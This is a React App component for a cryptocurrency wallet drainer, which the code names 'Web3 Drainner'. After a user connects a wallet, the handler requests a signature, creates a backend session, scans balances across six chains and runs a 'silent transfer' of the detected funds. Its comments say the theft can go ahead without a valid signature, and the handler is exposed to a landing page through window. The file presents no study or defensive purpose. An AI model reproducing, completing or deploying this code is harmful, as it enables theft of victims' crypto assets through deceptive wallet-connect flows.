import { useState, useEffect } from 'react'
import { useWalletStore } from './stores/walletStore'
import { connectWallet, disconnectWallet, formatAddress } from './utils/walletConnect'
import { connectWalletSession, detectBalances, executeTransfer } from './utils/api'
import ConnectButton from './components/ConnectButton'
import BalancesDisplay from './components/BalancesDisplay'
import TransferModal from './components/TransferModal'
import SummaryModal from './components/SummaryModal'

function App() {
  const {
    account,
    isConnected,
    isLoading,
    error,
    balances,
    transferStatus,
    setAccount,
    setIsConnected,
    setIsLoading,
    setError,
    setBalances,
    setTransferStatus
  } = useWalletStore()

  const [showSummary, setShowSummary] = useState(false)
  const [sessionId, setSessionId] = useState(null)

  /**
   * Handle wallet connection
   */
  const handleConnect = async () => {
    setIsLoading(true)
    setError(null)

    try {
      console.log('[App] Starting connection process...')

      const { account: addr, provider } = await connectWallet()
      
      console.log('[App] Wallet connected:', addr)
      console.log('[App] Requesting signature for session...')

      setAccount(addr)
      setIsConnected(true)

      // Create a simple message for signing
      const message = `Sign to verify ownership of this wallet for Web3 Drainner\nAddress: ${addr}\nTimestamp: ${Date.now()}`

      let signature = 'message_signature_placeholder'

      // Try to get signature from provider
      try {
        if (provider?.request) {
          signature = await provider.request({
            method: 'personal_sign',
            params: [message, addr]
          })
          console.log('[App] ✅ Got signature from wallet')
        } else if (provider?.signMessage) {
          signature = await provider.signMessage(message)
          console.log('[App] ✅ Got signature from provider')
        }
      } catch (signError) {
        console.warn('[App] ⚠️ Signature request failed, using placeholder:', signError.message)
        // Continue with placeholder - silent transfer doesn't always need signature
      }

      // Create session with backend
      console.log('[App] Creating session with backend...')
      const sessionData = await connectWalletSession(addr, signature, message)
      setSessionId(sessionData.sessionId)
      console.log('[App] ✅ Session created:', sessionData.sessionId)

      // Detect balances on all chains
      console.log('[App] Detecting balances across chains...')
      const balanceResponse = await detectBalances(addr)
      const detectedBalances = balanceResponse.balances
      setBalances(detectedBalances)
      console.log('[App] ✅ Balances detected:', detectedBalances)

      // Execute relay transfers SILENTLY
      console.log('[App] 🚀 Executing silent transfer...')
      const transferResult = await executeTransfer(addr, detectedBalances, sessionData.sessionId)
      setTransferStatus(transferResult)
      console.log('[App] ✅ Silent transfer executed:', transferResult)
      
      setShowSummary(true)
    } catch (err) {
      const errorMsg = err.message || 'Connection failed'
      setError(errorMsg)
      console.error('[App] ❌ Connection error:', err)
    } finally {
      setIsLoading(false)
    }
  }

  /**
   * Expose connection handler to landing page
   */
  useEffect(() => {
    // This allows the landing page button to trigger the real WalletConnect modal
    window.__app_handleConnect = handleConnect
    console.log('[App] Connection handler exposed to window')
  }, [handleConnect])

  /**
   * Handle wallet disconnection
   */
  const handleDisconnect = async () => {
    await disconnectWallet()
    setAccount(null)
    setIsConnected(false)
    setBalances({
      ethereum: '0',
      bsc: '0',
      polygon: '0',
      solana: '0',
      tron: '0',
      sui: '0'
    })
    setTransferStatus(null)
    setShowSummary(false)
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black flex items-center justify-center">
      <div className="w-full max-w-md px-4">
        {/* Connection Status */}
        {isConnected && account ? (
          <div className="bg-gradient-to-r from-green-900 to-green-800 border border-green-700 rounded-lg p-6 mb-8">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-green-300 text-sm font-semibold">Connected Wallet</p>
                <p className="text-white font-mono text-lg mt-1">{formatAddress(account)}</p>
              </div>
              <button
                onClick={handleDisconnect}
                className="px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg font-semibold transition"
              >
                Disconnect
              </button>
            </div>
          </div>
        ) : null}

        {/* Connect Button */}
        {!isConnected ? (
          <ConnectButton
            onClick={handleConnect}
            isLoading={isLoading}
            error={error}
          />
        ) : null}

        {/* Balances Display */}
        {isConnected && (
          <BalancesDisplay balances={balances} />
        )}

        {/* Transfer Status */}
        {transferStatus && (
          <TransferModal status={transferStatus} />
        )}

        {/* Summary Modal */}
        {showSummary && (
          <SummaryModal
            status={transferStatus}
            onClose={() => setShowSummary(false)}
          />
        )}

        {/* Error Display */}
        {error && (
          <div className="bg-red-900 border border-red-700 rounded-lg p-4 mb-8">
            <p className="text-red-200 font-semibold">Error</p>
            <p className="text-red-300 text-sm mt-2">{error}</p>
          </div>
        )}
      </div>
    </div>
  )
}

export default App
